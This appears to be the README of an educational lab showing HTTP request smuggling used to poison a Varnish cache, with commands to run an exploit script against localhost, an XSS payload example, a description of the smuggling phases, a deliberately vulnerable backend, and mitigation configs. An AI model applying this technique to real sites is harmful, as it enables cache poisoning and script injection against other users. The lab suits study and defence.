# HRS-Desynchronization

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker)](docker-compose.yml)
[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python)](exploit/attack.py)

Educational lab for demonstrating cache poisoning through HTTP request smuggling in a three-tier stack:

`attacker -> Nginx stream proxy -> Varnish cache -> Gunicorn/Flask`

## Architecture

```
  ┌─────────────┐   port 80    ┌───────────────────┐  :6081  ┌──────────────────┐  :8000  ┌──────────────────────┐
  │  Attacker   │─────────────▶│  Nginx            │────────▶│  Varnish         │────────▶│  Gunicorn / Flask    │
  │ attack.py   │   raw TCP    │  stream proxy     │         │  cache-layer     │         │  backend-origin      │
  └─────────────┘              │  no HTTP parsing  │         │  caches .js/.css │         │  patched for desync  │
                               └───────────────────┘         └──────────────────┘         └──────────────────────┘
```

Important detail: this lab does **not** use Nginx HTTP proxying. `nginx/nginx.conf` uses the `stream {}` module, so Nginx forwards raw TCP bytes to Varnish without normalizing headers.

## Repository Layout

```
HRS-Desynchronization/
├── docker-compose.yml
├── docs/
├── nginx/
├── varnish/
├── backend/
├── exploit/
└── mitigation/
```

## Documentation

Detailed project docs are available in [`docs/`](./docs/README.md):

- [`docs/assumptions.md`](./docs/assumptions.md)
- [`docs/architecture.md`](./docs/architecture.md)
- [`docs/attack-theory.md`](./docs/attack-theory.md)
- [`docs/attack-execution.md`](./docs/attack-execution.md)
- [`docs/mitigation.md`](./docs/mitigation.md)

## Prerequisites

- Docker with `docker compose`
- Python 3.10+
- Optional: `pip install -r exploit/requirements.txt` if you want the HTTP/2 probe in `attack.py`

## Start The Lab

```bash
docker compose up --build -d
docker compose ps
```

Expected services:

- `frontend-proxy` on `localhost:80`
- `cache-layer` on internal port `6081`
- `backend-origin` on internal port `8000`

## Safe Baseline Checks

Use these before the exploit:

```bash
curl -i http://localhost/
curl -i "http://localhost/reflect?q=hello"
```

Do **not** request `/js/app.js` before the attack if you plan to poison the plain `/js/app.js` cache key. A normal request will warm the cache and the trigger request will no longer reach the backend.

## Perform The Attack

There are two reliable ways to run the demo.

### Option 1: Recommended, use a fresh cache key

This avoids collisions with an already-cached `/js/app.js`.

```bash
python3 exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path '/js/app.js?cb=demo1'
```

Custom payload example:

```bash
python3 exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path '/js/app.js?cb=demo2' \
  --payload "<script>alert('owned')</script>"
```

Verify manually:

```bash
curl -i "http://localhost/js/app.js?cb=demo1"
```

Successful output should show:

- `X-Cache: HIT`
- an HTML body containing your payload instead of the legitimate JavaScript file

### Option 2: Poison the exact `/js/app.js` path

First reset Varnish so `/js/app.js` is not already cached:

```bash
docker compose restart cache-layer
```

Then run:

```bash
python3 exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path /js/app.js
```

Manual verification:

```bash
curl -i http://localhost/js/app.js
```

## What The Exploit Does

`exploit/attack.py` performs three phases:

1. Sends a `POST /reflect` containing both `Content-Length` and `Transfer_Encoding: chunked`.
2. Smuggles a `GET /reflect?q=<payload>` prefix into the backend keep-alive connection.
3. Triggers a fetch for the chosen cache key, causing Varnish to cache the reflected payload under that key.

The script now accepts `--target-path`, so you can poison either:

- `/js/app.js`
- `/js/app.js?cb=<unique>`

Using a unique query string is the easiest way to ensure the target is a cache miss.

Note: in this lab the exploit deliberately uses `Transfer_Encoding` with an underscore. The patched backend accepts it, and that is the variant that was verified to work here. Replacing it with the standard `Transfer-Encoding` header caused the request to fail with `400 Bad Request` during testing.

## Troubleshooting

### Attack says `Cache HIT received but payload not detected`

That usually means the target path was already cached before the exploit ran.

Fix:

```bash
docker compose restart cache-layer
```

or rerun with a fresh cache key:

```bash
python3 exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path '/js/app.js?cb=retry1'
```

### Homepage or another path looks poisoned unexpectedly

The backend connection can remain desynchronized if you interrupt testing midway. Reset the lab:

```bash
docker compose restart frontend-proxy cache-layer backend-origin
```

### See live logs

```bash
docker compose logs -f frontend-proxy cache-layer backend-origin
```

## Mitigation

Hardened configs are included in `mitigation/`.

Apply them:

```bash
cp mitigation/nginx.conf nginx/nginx.conf
cp mitigation/default.vcl varnish/default.vcl
docker compose up --build -d
```

Mitigation idea summary:

- reject requests that carry both `Content-Length` and `Transfer-Encoding`
- strip `Transfer-Encoding` before forwarding upstream
- avoid backend connection reuse for ambiguous requests

## Teardown

```bash
docker compose down
```

## References

- RFC 7230 Section 3.3.3: https://tools.ietf.org/html/rfc7230#section-3.3.3
- PortSwigger request smuggling: https://portswigger.net/web-security/request-smuggling
- OWASP HTTP Request Smuggling: https://owasp.org/www-community/attacks/HTTP_Request_Smuggling

## Disclaimer

For educational use only. Test only on systems you own or are explicitly authorized to assess.

## License

MIT. See [LICENSE](LICENSE).
